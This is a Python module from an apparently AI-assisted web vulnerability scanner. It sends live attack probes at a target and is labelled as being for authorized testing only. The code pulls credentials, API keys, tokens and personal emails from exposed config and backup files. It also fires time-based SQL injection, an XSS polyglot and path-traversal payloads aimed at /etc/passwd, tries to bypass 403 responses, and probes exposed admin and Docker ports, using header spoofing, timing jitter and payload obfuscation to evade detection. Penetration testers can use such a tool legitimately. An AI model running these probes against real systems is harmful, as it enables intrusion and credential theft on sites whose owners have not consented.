# Developed by Channa Sandeepa | OmniScan-AI v2.0 | Copyright 2026
"""Autonomous follow-up probes: credential extraction, 403 bypass, param exploits,
cookie flags, and alternate-port HTTP recon. Authorized testing only."""

from __future__ import annotations

import re
import time
from typing import Any
from urllib.parse import urlencode, urlparse, urlunparse

import aiohttp

from .ai_auditor import AIAuditor
from .infiltrator import bypass_403_probes
from .evasion import EvasionProfile, build_browser_headers
from .payload_obfuscation import expand_probe_values
from .scanner_engine import short_module_http_timeout

SEVERITY_HIGH = "High"
SEVERITY_MEDIUM = "Medium"
SEVERITY_LOW = "Low"

_SENSITIVE_PATH_HINTS: tuple[str, ...] = (
    ".env",
    "config",
    "settings",
    "secrets",
    "credentials",
    "database",
    "wp-config",
    "backup",
    ".bak",
    "dump",
    "phpinfo",
    "appsettings",
    "docker-compose",
)

_CREDENTIAL_PATTERNS: list[tuple[str, re.Pattern[str]]] = [
    (
        "connection_string",
        re.compile(
            r"(?i)(?:mysql|mariadb|postgres(?:ql)?|mongodb(?:\+srv)?|redis|sqlserver)://"
            r"[^\s\"'<>]{8,300}"
        ),
    ),
    (
        "key_value_secret",
        re.compile(
            r"(?i)(?:api[_-]?key|secret[_-]?key|client[_-]?secret|password|passwd|db_password)"
            r"\s*[=:]\s*['\"]?([^\s\"'<>#]{6,120})['\"]?"
        ),
    ),
    (
        "aws_key_in_text",
        re.compile(r"(?<![0-9A-Za-z])AKIA[0-9A-Z]{16}(?![0-9A-Za-z])"),
    ),
    (
        "generic_token",
        re.compile(r"(?i)(?:token|bearer|authorization)\s*[:=]\s*['\"]?([^\s\"'<>]{12,80})"),
    ),
    (
        "env_assignment",
        re.compile(
            r"(?i)(?:process\.env|import\.meta\.env)\.([A-Za-z_][A-Za-z0-9_]{0,63})\s*=\s*"
            r"['\"]([^'\"\\\\]{1,240})['\"]"
        ),
    ),
    (
        "env_assignment_bracket",
        re.compile(
            r"(?i)(?:process\.env|import\.meta\.env)\[\s*['\"]([^'\"]{1,64})['\"]\s*\]\s*=\s*"
            r"['\"]([^'\"\\\\]{1,240})['\"]"
        ),
    ),
    (
        "vue_app_value",
        re.compile(r"(?i)(VUE_APP_[A-Z0-9_]+|[Vv]ue_[Ee]nv_[A-Z0-9_]+)\s*:\s*['\"]([^'\"\\\\]{1,240})['\"]"),
    ),
    (
        "react_public_env",
        re.compile(
            r"(?i)(REACT_APP_[A-Z0-9_]+|NEXT_PUBLIC_[A-Z0-9_]+)\s*=\s*['\"]([^'\"\\\\]{1,240})['\"]"
        ),
    ),
    (
        "json_secret_pair",
        re.compile(
            r"(?i)['\"](?:apiKey|api_key|API_KEY|secret|password|access_token|refresh_token|token)['\"]\s*:"
            r'\s*["\']([^"\'\\]{8,400})["\']'
        ),
    ),
]

_PII_PATTERNS: list[tuple[str, re.Pattern[str]]] = [
    (
        "pii_email",
        re.compile(
            r"(?<![A-Za-z0-9._%+-])[A-Za-z0-9._%+-]{1,64}@"
            r"[A-Za-z0-9](?:[A-Za-z0-9.-]{0,62}[A-Za-z0-9])?"
            r"\.[A-Za-z]{2,24}(?![A-Za-z0-9])"
        ),
    ),
    (
        "pii_jwt",
        re.compile(
            r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b"
        ),
    ),
    (
        "pii_bearer_header",
        re.compile(r"(?i)\bBearer\s+([A-Za-z0-9._=+-]{24,1200})\b"),
    ),
    (
        "pii_json_token",
        re.compile(
            r'(?i)["\'](?:access_token|refresh_token|id_token|session_token|auth_token)["\']\s*:\s*'
            r'["\']([A-Za-z0-9._=+/:-]{20,800})["\']'
        ),
    ),
]

_SQL_TIME_PAYLOAD = "' AND (SELECT 1 FROM (SELECT SLEEP(2))a)-- -"
_XSS_POLYGLOT = (
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/"
    "</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//\\x3e"
)
_LFI_UNIX = "....//....//....//....//etc/passwd"
_LFI_WIN = "..\\..\\..\\..\\windows\\win.ini"

_PORT_HTTP_PATHS: dict[int, tuple[str, ...]] = {
    8080: ("/", "/jenkins/login", "/manager/html", "/actuator/health", "/api/", "/login"),
    8443: ("/", "/manager/html", "/actuator/health"),
    8000: ("/", "/admin", "/api/", "/docs"),
    8888: ("/", "/api/", "/jupyter/login"),
    9090: ("/", "/metrics", "/api/v1/query"),
    9000: ("/", "/sonar/web_api/", "/api/system/status"),
    5000: ("/", "/api/", "/v2/api-docs"),
    2375: ("/version", "/containers/json"),
    15672: ("/", "/api/overview"),
    7001: ("/", "/console"),
    9200: ("/", "/_cat/health"),
}


def _host_from_target(url: str) -> str:
    p = urlparse(url if "://" in url else f"https://{url}")
    return (p.hostname or "").strip()


def _scheme_for_port(port: int) -> str:
    if port in (443, 8443):
        return "https"
    return "http"


_REDIRECT_STATUS = frozenset({301, 302, 303, 307, 308})
_MAX_REDIRECT_BODY_LOG = 6000


def _match_preview(kind: str, m: re.Match[str]) -> str:
    multi = (
        "env_assignment",
        "env_assignment_bracket",
        "vue_app_value",
        "react_public_env",
    )
    if kind in multi and m.lastindex and m.lastindex >= 2:
        a = str(m.group(1) or "").strip()
        b = str(m.group(2) or "").strip()
        s = f"{a}={b}"
        return s[:220] + ("…" if len(s) > 220 else "")
    if m.lastindex:
        g = str(m.group(1) or m.group(0)).strip()
        return (g[:220] + ("…" if len(g) > 220 else "")) if g else str(m.group(0)).strip()[:220]
    raw = str(m.group(0)).strip()
    return raw[:220] + ("…" if len(raw) > 220 else "")


def _log_redirect_response(url: str, status: int, headers: Any, body_sample: bytes) -> None:
    loc = None
    try:
        loc = headers.get("Location") if headers is not None else None
    except (AttributeError, TypeError):
        loc = None
    txt = body_sample.decode("utf-8", errors="replace")[:_MAX_REDIRECT_BODY_LOG]
    body_note = txt if txt.strip() else "(empty redirect body)"
    print(
        f"[INFILTRATION] HTTP {status} {url} Location={loc!r}\n"
        f"--- body (allow_redirects=False) ---\n{body_note}\n--- end body ---",
        flush=True,
    )


def _extract_from_body(text: str, source: str) -> list[dict]:
    findings: list[dict] = []
    seen: set[str] = set()
    for kind, pat in _CREDENTIAL_PATTERNS:
        for m in pat.finditer(text):
            val = _match_preview(kind, m)
            if len(val) < 4 or val in seen:
                continue
            seen.add(val)
            preview = val[:120] + ("…" if len(val) > 120 else "")
            findings.append(
                {
                    "type": "chain_extract",
                    "subtype": kind,
                    "severity": SEVERITY_HIGH,
                    "source_url": source,
                    "match_preview": preview,
                    "note": "Heuristic pattern in fetched sensitive path body",
                }
            )
    for kind, pat in _PII_PATTERNS:
        for m in pat.finditer(text):
            val = _match_preview(kind, m)
            if len(val) < 6 or val in seen:
                continue
            seen.add(val)
            preview = val[:120] + ("…" if len(val) > 120 else "")
            findings.append(
                {
                    "type": "chain_extract",
                    "subtype": kind,
                    "severity": SEVERITY_HIGH,
                    "source_url": source,
                    "match_preview": preview,
                    "note": "Possible PII, token, or JWT in response body (verify; minimize exposure in reports)",
                }
            )
    return findings


class SmartInfiltrationEngine:
    """Second-phase autonomous probes driven by prior scan rows."""

    def __init__(
        self,
        evasion: EvasionProfile | None = None,
        *,
        max_body_bytes: int = 262_144,
        sql_delay_threshold_sec: float = 2.2,
        extended_403_bypass: bool = False,
        obfuscate_payloads: bool = False,
    ) -> None:
        self._evasion = evasion or EvasionProfile()
        self._max_body = max_body_bytes
        self._sql_threshold = sql_delay_threshold_sec
        # Shared aiohttp session: 10s connect/read/connect — see short_module_http_timeout()
        self._timeout = short_module_http_timeout()
        self._extended_403 = bool(extended_403_bypass)
        self._obfuscate_payloads = bool(obfuscate_payloads)

    async def run(
        self,
        *,
        target_url: str,
        path_rows: list[dict],
        sensitive_rows: list[dict],
        param_rows: list[dict],
        port_rows: list[dict],
        extra_headers: dict[str, str] | None = None,
    ) -> dict[str, Any]:
        print(
            "[DEBUG] SmartInfiltrationEngine.run — opening HTTP session (10s aiohttp timeout)",
            flush=True,
        )
        extra = dict(extra_headers or {})
        host = _host_from_target(target_url)
        chain: list[dict] = []
        bypass: list[dict] = []
        param_active: list[dict] = []
        cookies: list[dict] = []
        port_hits: list[dict] = []
        recommendations: list[dict] = []

        try:
            connector = self._evasion.aiohttp_connector(ssl=True, limit=24)
        except RuntimeError:
            return self._finalize(
                chain, bypass, param_active, cookies, port_hits, recommendations, snapshot={}
            )

        async with aiohttp.ClientSession(
            timeout=self._timeout, connector=connector, trust_env=False
        ) as session:
            referer = target_url if "://" in target_url else f"https://{target_url}"
            ref = referer if referer.endswith("/") else f"{referer}/"

            await self._evasion.apply_infiltration_jitter()
            print("[DEBUG] Infiltration: initial GET / cookie scrape", flush=True)
            try:
                bh = build_browser_headers(referer=ref, extra=extra, evasion=self._evasion)
                async with session.get(
                    target_url, headers=bh, allow_redirects=False
                ) as resp:
                    raw = await resp.content.read(self._max_body)
                    if resp.status in _REDIRECT_STATUS:
                        _log_redirect_response(
                            target_url, resp.status, resp.headers, raw
                        )
                    text = raw.decode("utf-8", errors="replace")
                    if resp.status == 200 or resp.status in _REDIRECT_STATUS:
                        chain.extend(_extract_from_body(text, target_url))
                    cookies.extend(
                        self._parse_set_cookie_headers(resp.headers, str(resp.url))
                    )
            except (aiohttp.ClientError, TimeoutError, OSError):
                pass

            chain_urls: list[str] = []
            seen_chain: set[str] = set()
            for row in sensitive_rows:
                if row.get("status") == 200:
                    u = str(row.get("url", ""))
                    if u and u not in seen_chain:
                        seen_chain.add(u)
                        chain_urls.append(u)
            for row in path_rows:
                if row.get("status") != 200:
                    continue
                path_l = str(row.get("path", "")).lower()
                u = str(row.get("url", ""))
                if not u or not any(h in path_l for h in _SENSITIVE_PATH_HINTS):
                    continue
                if u not in seen_chain:
                    seen_chain.add(u)
                    chain_urls.append(u)
            _nchain = min(len(chain_urls), 18)
            print(
                f"[DEBUG] Infiltration: chain extraction pulls ({_nchain} candidate URL(s))",
                flush=True,
            )
            for url in chain_urls[:18]:
                await self._evasion.apply_infiltration_jitter()
                try:
                    h = build_browser_headers(referer=ref, extra=extra, evasion=self._evasion)
                    async with session.get(url, headers=h, allow_redirects=False) as resp:
                        raw = await resp.content.read(self._max_body)
                        if resp.status in _REDIRECT_STATUS:
                            _log_redirect_response(url, resp.status, resp.headers, raw)
                        if resp.status == 200 or resp.status in _REDIRECT_STATUS:
                            text = raw.decode("utf-8", errors="replace")
                            chain.extend(_extract_from_body(text, url))
                except (aiohttp.ClientError, TimeoutError, OSError):
                    continue

            bypass.extend(
                await bypass_403_probes(
                    session,
                    path_rows=path_rows,
                    referer_base=ref,
                    extra_headers=extra,
                    evasion=self._evasion,
                    extended_403=self._extended_403,
                )
            )

            param_jobs = self._pick_param_jobs(param_rows, limit=7)
            print(
                f"[DEBUG] Infiltration: param-vector probes ({len(param_jobs)} job(s))",
                flush=True,
            )
            for job in param_jobs:
                try:
                    param_active.extend(
                        await self._probe_param_vectors(session, ref, extra, job)
                    )
                except Exception:
                    continue

            print("[DEBUG] Infiltration: alternate-port HTTP probes", flush=True)
            for pr in port_rows[:16]:
                pnum = int(pr.get("port", 0))
                if pnum not in _PORT_HTTP_PATHS or not host:
                    continue
                scheme = _scheme_for_port(pnum)
                base_netloc = f"{host}:{pnum}"
                for suffix in _PORT_HTTP_PATHS[pnum][:4]:
                    probe = f"{scheme}://{base_netloc}{suffix}"
                    await self._evasion.apply_infiltration_jitter()
                    try:
                        h = build_browser_headers(referer=ref, extra=extra, evasion=self._evasion)
                        async with session.get(probe, headers=h, allow_redirects=False) as resp:
                            if resp.status in (200, 301, 302, 401, 403):
                                port_hits.append(
                                    {
                                        "type": "alternate_port",
                                        "severity": SEVERITY_MEDIUM,
                                        "url": probe,
                                        "status": resp.status,
                                        "port": pnum,
                                        "note": pr.get("service", ""),
                                    }
                                )
                    except (aiohttp.ClientError, TimeoutError, OSError):
                        continue

        print("[DEBUG] SmartInfiltrationEngine.run — building snapshot & recommendations", flush=True)
        snapshot = {
            "chain_hits": len(chain),
            "bypass_hits": len(bypass),
            "param_probes": len(param_active),
            "cookie_issues": len([c for c in cookies if c.get("risk")]),
            "port_followups": len(port_hits),
            "open_ports": [int(r["port"]) for r in port_rows if r.get("port")],
            "count_403": sum(1 for r in path_rows if r.get("status") == 403),
        }
        recommendations = AIAuditor.infiltration_playbook(snapshot)
        return self._finalize(
            chain, bypass, param_active, cookies, port_hits, recommendations, snapshot
        )

    @staticmethod
    def _finalize(
        chain: list[dict],
        bypass: list[dict],
        param_active: list[dict],
        cookies: list[dict],
        port_hits: list[dict],
        recommendations: list[dict],
        snapshot: dict,
    ) -> dict[str, Any]:
        return {
            "chain_extractions": chain,
            "forbidden_bypass": bypass,
            "param_active": param_active,
            "cookie_audit": cookies,
            "alternate_port_hits": port_hits,
            "ai_recommendations": recommendations,
            "snapshot": snapshot,
        }

    @staticmethod
    def _parse_set_cookie_headers(headers: Any, page_url: str) -> list[dict]:
        raw: list[str] = []
        try:
            raw = list(headers.getall("Set-Cookie"))  # type: ignore[attr-defined]
        except (AttributeError, KeyError, TypeError):
            pass
        if not raw and hasattr(headers, "get"):
            sc = headers.get("Set-Cookie")
            if sc:
                raw = [sc] if isinstance(sc, str) else list(sc)
        rows: list[dict] = []
        for line in raw:
            if not line:
                continue
            first = str(line).split(";", 1)[0]
            name = first.split("=", 1)[0].strip() if "=" in first else first.strip()
            lower = str(line).lower()
            httponly = "httponly" in lower
            secure = "secure" in lower
            risk: list[str] = []
            if not httponly:
                risk.append("missing HttpOnly (XSS may steal)")
            if not secure and page_url.lower().startswith("https"):
                risk.append("missing Secure on HTTPS")
            rows.append(
                {
                    "type": "cookie_audit",
                    "cookie_name": name[:80],
                    "httponly": httponly,
                    "secure": secure,
                    "severity": SEVERITY_MEDIUM if risk else SEVERITY_LOW,
                    "risk": "; ".join(risk) if risk else "flags look strict",
                    "page_url": page_url,
                }
            )
        return rows

    @staticmethod
    def _pick_param_jobs(param_rows: list[dict], *, limit: int) -> list[dict]:
        seen: set[tuple[str, str]] = set()
        jobs: list[dict] = []
        ordered = sorted(
            param_rows,
            key=lambda r: (0 if r.get("severity") == SEVERITY_MEDIUM else 1, str(r.get("param", ""))),
        )
        for r in ordered:
            if r.get("method") != "GET":
                continue
            p = str(r.get("param", ""))
            if not p:
                continue
            key = ("GET", p)
            if key in seen:
                continue
            seen.add(key)
            base_url = str(r.get("url", "")).split("?", 1)[0]
            jobs.append({"param": p, "base_url": base_url})
            if len(jobs) >= limit:
                break
        return jobs

    async def _probe_param_vectors(
        self,
        session: aiohttp.ClientSession,
        referer: str,
        extra: dict[str, str],
        job: dict,
    ) -> list[dict]:
        out: list[dict] = []
        param = job["param"]
        base = job["base_url"]
        if not base:
            return out

        print(
            "[DEBUG] Infiltration: _probe_param_vectors — "
            f"param={param!r} base={base[:120]}",
            flush=True,
        )

        async def _get(url: str) -> tuple[int, str, float]:
            t0 = time.monotonic()
            try:
                h = build_browser_headers(referer=referer, extra=extra, evasion=self._evasion)
                async with session.get(url, headers=h, allow_redirects=False) as resp:
                    raw = await resp.content.read(120_000)
                    if resp.status in _REDIRECT_STATUS:
                        _log_redirect_response(url, resp.status, resp.headers, raw)
                    body = raw.decode("utf-8", errors="replace")
                    return resp.status, body, time.monotonic() - t0
            except (aiohttp.ClientError, TimeoutError, OSError):
                return -1, "", time.monotonic() - t0

        await self._evasion.apply_infiltration_jitter()
        st0, body0, _ = await _get(base)
        if st0 < 0:
            return out

        for sql_pl in expand_probe_values(
            _SQL_TIME_PAYLOAD, enabled=self._obfuscate_payloads, max_variants=4
        ):
            sql_url = f"{base}?{urlencode([(param, sql_pl)])}"
            await self._evasion.apply_infiltration_jitter()
            _, _, elapsed = await _get(sql_url)
            if elapsed >= self._sql_threshold:
                out.append(
                    {
                        "type": "param_sqli_time",
                        "severity": SEVERITY_HIGH,
                        "param": param,
                        "url": sql_url[:500],
                        "note": f"Response delayed ~{elapsed:.1f}s (possible time-based SQLi; verify manually)",
                    }
                )
                break

        for xss_pl in expand_probe_values(
            _XSS_POLYGLOT, enabled=self._obfuscate_payloads, max_variants=4
        ):
            xss_url = f"{base}?{urlencode([(param, xss_pl)])}"
            await self._evasion.apply_infiltration_jitter()
            st_x, body_x, _ = await _get(xss_url)
            if st_x == 200 and (
                "onclic" in body_x.lower()
                or "alert(1)" in body_x.lower()
                or xss_pl[: min(18, len(xss_pl))] in body_x
            ):
                out.append(
                    {
                        "type": "param_xss_reflect",
                        "severity": SEVERITY_MEDIUM,
                        "param": param,
                        "url": xss_url[:500],
                        "note": "Polyglot payload reflected in body",
                    }
                )
                break

        for label, payload in (("lfi_unix", _LFI_UNIX), ("lfi_win", _LFI_WIN)):
            for lfi_pl in expand_probe_values(
                payload, enabled=self._obfuscate_payloads, max_variants=4
            ):
                lfi_url = f"{base}?{urlencode([(param, lfi_pl)])}"
                await self._evasion.apply_infiltration_jitter()
                st_l, body_l, _ = await _get(lfi_url)
                if st_l != 200:
                    continue
                if label == "lfi_unix" and "root:" in body_l:
                    out.append(
                        {
                            "type": "param_lfi",
                            "severity": SEVERITY_HIGH,
                            "param": param,
                            "url": lfi_url[:500],
                            "note": "Possible /etc/passwd content in response",
                        }
                    )
                    break
                if label == "lfi_win" and "[fonts]" in body_l.lower():
                    out.append(
                        {
                            "type": "param_lfi",
                            "severity": SEVERITY_HIGH,
                            "param": param,
                            "url": lfi_url[:500],
                            "note": "Possible win.ini signature in response",
                        }
                    )
                    break
        return out
